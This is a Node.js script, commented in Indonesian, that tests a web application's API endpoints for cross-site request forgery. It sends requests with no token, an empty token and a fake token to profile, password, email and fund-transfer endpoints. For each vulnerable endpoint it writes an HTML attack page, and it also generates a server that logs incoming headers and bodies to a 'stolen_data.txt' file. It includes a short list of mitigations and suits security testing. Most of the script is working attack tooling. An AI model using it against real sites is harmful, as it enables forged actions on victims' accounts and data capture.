const fs = require('fs');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');

// URL target - ganti dengan URL website React Anda
const TARGET_URL = 'http://localhost:3000';

// Folder untuk menyimpan CSRF PoC (Proof of Concept)
const POC_FOLDER = 'csrf_poc';

// Log file
const LOG_FILE = 'csrf_results.txt';

// Fungsi untuk log ke file
function logToFile(message) {
  fs.appendFileSync(LOG_FILE, `${new Date().toISOString()} - ${message}\n`);
}

// Daftar endpoint yang sering rentan terhadap CSRF
const targetEndpoints = [
  { url: '/api/user/profile', method: 'post', description: 'Update Profil Pengguna' },
  { url: '/api/user/password', method: 'post', description: 'Ganti Password' },
  { url: '/api/transfer', method: 'post', description: 'Transfer Dana' },
  { url: '/api/settings', method: 'post', description: 'Update Pengaturan' },
  { url: '/api/user/email', method: 'post', description: 'Update Email' },
  { url: '/api/comments/add', method: 'post', description: 'Tambah Komentar' },
  { url: '/api/posts/create', method: 'post', description: 'Buat Post Baru' }
];

// Buat folder untuk PoC jika belum ada
if (!fs.existsSync(POC_FOLDER)) {
  fs.mkdirSync(POC_FOLDER);
}

// Fungsi untuk mengambil cookie dan token CSRF
async function fetchCookiesAndTokens() {
  console.log('Mengambil cookies dan token CSRF...');
  
  try {
    const response = await axios.get(`${TARGET_URL}/login`, {
      maxRedirects: 5,
      withCredentials: true
    });
    
    // Ambil cookies dari response
    const cookies = response.headers['set-cookie'] || [];
    console.log(`Cookies ditemukan: ${cookies.length}`);
    
    // Parse HTML untuk mencari CSRF token
    const $ = cheerio.load(response.data);
    let csrfToken = $('input[name="csrf_token"]').val() || 
                    $('meta[name="csrf-token"]').attr('content') || 
                    $('input[name="_token"]').val();
    
    console.log(csrfToken ? `CSRF token ditemukan: ${csrfToken}` : 'CSRF token tidak ditemukan.');
    
    return {
      cookies: cookies.join('; '),
      csrfToken
    };
  } catch (error) {
    console.error('Error saat mengambil cookies dan token:', error.message);
    return { cookies: '', csrfToken: null };
  }
}

// Fungsi untuk memeriksa apakah suatu endpoint rentan terhadap CSRF
async function testEndpointForCSRF(endpoint, cookies, csrfToken) {
  console.log(`\nMenguji endpoint ${endpoint.url} untuk kerentanan CSRF...`);
  
  // Kasus pengujian:
  // 1. Kirim request tanpa CSRF token sama sekali
  // 2. Kirim request dengan CSRF token kosong
  // 3. Kirim request dengan CSRF token palsu
  // Jika salah satu dari ini berhasil, endpoint mungkin rentan terhadap CSRF
  
  // Data payload untuk request
  const testData = {
    testField1: 'testValue1',
    testField2: 'testValue2'
  };
  
  // Jika endpoint user/profil, buat payload yang lebih spesifik
  if (endpoint.url.includes('profile')) {
    testData.name = 'CSRF Test';
    testData.email = 'csrf.test@example.com';
  } else if (endpoint.url.includes('password')) {
    testData.password = 'CSRFTest123!';
    testData.password_confirmation = 'CSRFTest123!';
  }
  
  let isVulnerable = false;
  let vulnerabilityDetails = [];
  
  // Test 1: Tanpa CSRF token
  try {
    const response = await axios.post(`${TARGET_URL}${endpoint.url}`, testData, {
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookies
      },
      validateStatus: false
    });
    
    console.log(`Test 1 (Tanpa token) - Status: ${response.status}`);
    
    // Jika status 200 OK atau 201 Created, mungkin rentan
    if (response.status === 200 || response.status === 201 || response.status === 204) {
      isVulnerable = true;
      vulnerabilityDetails.push('Request tanpa CSRF token berhasil.');
    }
  } catch (error) {
    console.log(`Test 1 Error: ${error.message}`);
  }
  
  // Test 2: Dengan CSRF token kosong
  try {
    const testDataWithEmptyToken = { ...testData, csrf_token: '' };
    
    const response = await axios.post(`${TARGET_URL}${endpoint.url}`, testDataWithEmptyToken, {
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookies
      },
      validateStatus: false
    });
    
    console.log(`Test 2 (Token kosong) - Status: ${response.status}`);
    
    if (response.status === 200 || response.status === 201 || response.status === 204) {
      isVulnerable = true;
      vulnerabilityDetails.push('Request dengan CSRF token kosong berhasil.');
    }
  } catch (error) {
    console.log(`Test 2 Error: ${error.message}`);
  }
  
  // Test 3: Dengan CSRF token palsu
  try {
    const testDataWithFakeToken = { ...testData, csrf_token: 'fake_csrf_token_123456789' };
    
    const response = await axios.post(`${TARGET_URL}${endpoint.url}`, testDataWithFakeToken, {
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookies,
        'X-CSRF-TOKEN': 'fake_csrf_token_123456789'
      },
      validateStatus: false
    });
    
    console.log(`Test 3 (Token palsu) - Status: ${response.status}`);
    
    if (response.status === 200 || response.status === 201 || response.status === 204) {
      isVulnerable = true;
      vulnerabilityDetails.push('Request dengan CSRF token palsu berhasil.');
    }
  } catch (error) {
    console.log(`Test 3 Error: ${error.message}`);
  }
  
  // Jika endpoint rentan, buat PoC HTML
  if (isVulnerable) {
    console.log('\x1b[31m%s\x1b[0m', `[VULNERABLE] Endpoint ${endpoint.url} rentan terhadap CSRF!`);
    logToFile(`[VULNERABLE] Endpoint ${endpoint.url} rentan terhadap CSRF: ${vulnerabilityDetails.join(' ')}`);
    createCSRFPoCFile(endpoint, testData);
  } else {
    console.log('\x1b[32m%s\x1b[0m', `[AMAN] Endpoint ${endpoint.url} tidak rentan terhadap CSRF.`);
    logToFile(`[AMAN] Endpoint ${endpoint.url} tidak rentan terhadap CSRF.`);
  }
  
  return isVulnerable;
}

// Fungsi untuk membuat file HTML Proof of Concept
function createCSRFPoCFile(endpoint, formData) {
  const fileName = `csrf_${endpoint.url.replace(/\//g, '_')}.html`;
  const filePath = path.join(POC_FOLDER, fileName);
  
  let formFields = '';
  for (const [key, value] of Object.entries(formData)) {
    formFields += `    <input type="hidden" name="${key}" value="${value}">\n`;
  }
  
  // Template HTML untuk PoC CSRF
  const htmlTemplate = `
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Proof of Concept - ${endpoint.description}</title>
  <style>
    body { font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; background-color: #f5f5f5; }
    .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h1 { color: #d9534f; }
    button { background-color: #d9534f; color: white; border: none; padding: 10px 15px; border-radius: 3px; cursor: pointer; }
    pre { background-color: #f8f8f8; padding: 10px; border: 1px solid #ddd; overflow: auto; }
    .warning { color: #d9534f; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <h1>CSRF Proof of Concept</h1>
    <p class="warning">Peringatan: Halaman ini adalah demonstrasi serangan CSRF terhadap endpoint: ${endpoint.url}</p>
    <p>Penjelasan: Ketika korban yang telah login mengakses halaman ini, formulir di bawah akan otomatis mengirimkan permintaan ke server sebagai pengguna korban tanpa sepengetahuan mereka.</p>
    
    <h3>Detail Serangan:</h3>
    <ul>
      <li><strong>Target:</strong> ${TARGET_URL}${endpoint.url}</li>
      <li><strong>Metode:</strong> ${endpoint.method.toUpperCase()}</li>
      <li><strong>Deskripsi:</strong> ${endpoint.description}</li>
    </ul>
    
    <h3>Payload:</h3>
    <pre>${JSON.stringify(formData, null, 2)}</pre>
    
    <hr>
    
    <h3>Klik tombol di bawah untuk memicu serangan:</h3>
    <p>(Dalam serangan nyata, form ini biasanya diajukan secara otomatis saat korban mengunjungi halaman)</p>
    
    <form id="csrf-form" action="${TARGET_URL}${endpoint.url}" method="${endpoint.method}">
${formFields}
      <button type="submit">Kirim Permintaan</button>
    </form>
    
    <script>
      // Aktifkan baris di bawah ini untuk formulir dikirim secara otomatis saat halaman dimuat
      // window.onload = function() { document.getElementById('csrf-form').submit(); };
    </script>
  </div>
</body>
</html>
`;

  fs.writeFileSync(filePath, htmlTemplate);
  console.log(`PoC CSRF untuk ${endpoint.url} disimpan ke ${filePath}`);
}

// Fungsi utama untuk pengujian CSRF
async function testCSRFVulnerabilities() {
  console.log('====== MEMULAI PENGUJIAN KERENTANAN CSRF ======');
  
  // Inisialisasi file log
  if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, `=== LAPORAN PENGUJIAN CSRF - ${new Date().toISOString()} ===\n\n`);
  }
  
  // Ambil cookies dan token
  const { cookies, csrfToken } = await fetchCookiesAndTokens();
  
  // Jika tidak bisa mendapatkan cookies, coba lanjutkan tanpa itu
  if (!cookies) {
    console.log('Peringatan: Tidak bisa mendapatkan cookies. Pengujian mungkin tidak akurat.');
  }
  
  // Uji setiap endpoint
  let vulnerableEndpoints = 0;
  for (const endpoint of targetEndpoints) {
    const isVulnerable = await testEndpointForCSRF(endpoint, cookies, csrfToken);
    if (isVulnerable) vulnerableEndpoints++;
    
    // Jeda antar pengujian
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Buat ringkasan HTML jika ada endpoint yang rentan
  if (vulnerableEndpoints > 0) {
    createCSRFSummaryFile(vulnerableEndpoints, targetEndpoints.length);
  }
  
  console.log('\n====== PENGUJIAN CSRF SELESAI ======');
  console.log(`Total endpoint diuji: ${targetEndpoints.length}`);
  console.log(`Endpoint rentan: ${vulnerableEndpoints}`);
  console.log(`Persentase kerentanan: ${(vulnerableEndpoints / targetEndpoints.length * 100).toFixed(2)}%`);
  console.log('PoC CSRF dapat ditemukan di folder:', POC_FOLDER);
  console.log('Log pengujian dapat ditemukan di:', LOG_FILE);
}

// Membuat file ringkasan
function createCSRFSummaryFile(vulnerableCount, totalCount) {
  const filePath = path.join(POC_FOLDER, 'csrf_summary.html');
  
  const htmlContent = `
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Vulnerability Summary Report</title>
  <style>
    body { font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; background-color: #f5f5f5; }
    .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h1 { color: #d9534f; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
    th { background-color: #f2f2f2; }
    .warning { color: #d9534f; font-weight: bold; }
    .success { color: #5cb85c; font-weight: bold; }
    .meter { height: 20px; background: #f3f3f3; border-radius: 3px; position: relative; margin: 10px 0; }
    .meter > span { display: block; height: 100%; border-radius: 3px; background-color: #d9534f; position: relative; overflow: hidden; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Laporan Kerentanan CSRF</h1>
    <p>Laporan pengujian kerentanan Cross-Site Request Forgery (CSRF) untuk ${TARGET_URL}</p>
    
    <h2>Ringkasan</h2>
    <div class="meter">
      <span style="width: ${(vulnerableCount / totalCount * 100).toFixed(2)}%"></span>
    </div>
    <p><span class="warning">${vulnerableCount}</span> dari <span>${totalCount}</span> endpoint rentan terhadap CSRF (${(vulnerableCount / totalCount * 100).toFixed(2)}%)</p>
    
    <h2>Daftar PoC CSRF</h2>
    <table>
      <tr>
        <th>Endpoint</th>
        <th>Deskripsi</th>
        <th>PoC</th>
      </tr>
      ${targetEndpoints.map(endpoint => {
        const fileName = `csrf_${endpoint.url.replace(/\//g, '_')}.html`;
        const fileExists = fs.existsSync(path.join(POC_FOLDER, fileName));
        return `
      <tr>
        <td>${endpoint.url}</td>
        <td>${endpoint.description}</td>
        <td>${fileExists ? `<a href="${fileName}">Lihat PoC</a>` : '<span class="success">Aman</span>'}</td>
      </tr>`;
      }).join('')}
    </table>
    
    <h2>Mitigasi CSRF</h2>
    <p>Berikut adalah beberapa cara untuk memitigasi kerentanan CSRF:</p>
    <ul>
      <li><strong>Token CSRF</strong>: Implementasikan token anti-CSRF yang divalidasi di server</li>
      <li><strong>SameSite Cookie</strong>: Gunakan SameSite=Strict atau SameSite=Lax pada cookie</li>
      <li><strong>Origin/Referer Checking</strong>: Validasi header Origin atau Referer</li>
      <li><strong>Custom Request Headers</strong>: Tambahkan header khusus dalam permintaan AJAX</li>
      <li><strong>Double Submit Cookie</strong>: Implementasikan pola Double Submit Cookie</li>
    </ul>
  </div>
</body>
</html>
  `;
  
  fs.writeFileSync(filePath, htmlContent);
  console.log(`Ringkasan vulnerabilitas CSRF disimpan ke ${filePath}`);
}

// Jalankan pengujian
testCSRFVulnerabilities().catch(error => {
  console.error('Terjadi kesalahan:', error);
});

// Membuat catcher untuk CSRF (halaman yg akan menerima data stolen)
function createCSRFCatcherScript() {
  const catcherPath = path.join(POC_FOLDER, 'csrf_catcher.js');
  
  const catcherCode = `
const http = require('http');
const url = require('url');
const fs = require('fs');

// Port untuk server listener
const PORT = 3001;

// Buat server untuk menangkap data
const server = http.createServer((req, res) => {
  // Set CORS headers untuk menerima request dari mana saja
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }
  
  // Parse query parameters dan log data yang masuk
  const queryObject = url.parse(req.url, true).query;
  
  console.log('------------------------------------');
  console.log(\`[\${new Date().toISOString()}] Data diterima:\`);
  console.log('Method:', req.method);
  console.log('URL:', req.url);
  console.log('Headers:', JSON.stringify(req.headers, null, 2));
  
  // Jika ada data body, tangkap
  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      console.log('Body:', body);
      
      // Log ke file
      fs.appendFileSync('stolen_data.txt', \`[\${new Date().toISOString()}]\\nURL: \${req.url}\\nHeaders: \${JSON.stringify(req.headers, null, 2)}\\nBody: \${body}\\n\\n\`);
      
      // Kirim respon sukses
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'success', message: 'Data diterima' }));
    });
  } else {
    // Untuk GET request, log query params
    console.log('Query:', JSON.stringify(queryObject, null, 2));
    
    // Log ke file
    fs.appendFileSync('stolen_data.txt', \`[\${new Date().toISOString()}]\\nURL: \${req.url}\\nHeaders: \${JSON.stringify(req.headers, null, 2)}\\nQuery: \${JSON.stringify(queryObject, null, 2)}\\n\\n\`);
    
    // Kirim respon sukses
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Data diterima' }));
  }
});

server.listen(PORT, () => {
  console.log(\`CSRF data catcher berjalan di http://localhost:\${PORT}\`);
  console.log('Menunggu data yang dikirim dari payload CSRF...');
});
  `;
  
  fs.writeFileSync(catcherPath, catcherCode);
  console.log(`CSRF data catcher disimpan ke ${catcherPath}`);
  logToFile(`CSRF data catcher dibuat di ${catcherPath}`);
}

// Buat script catcher
createCSRFCatcherScript(); 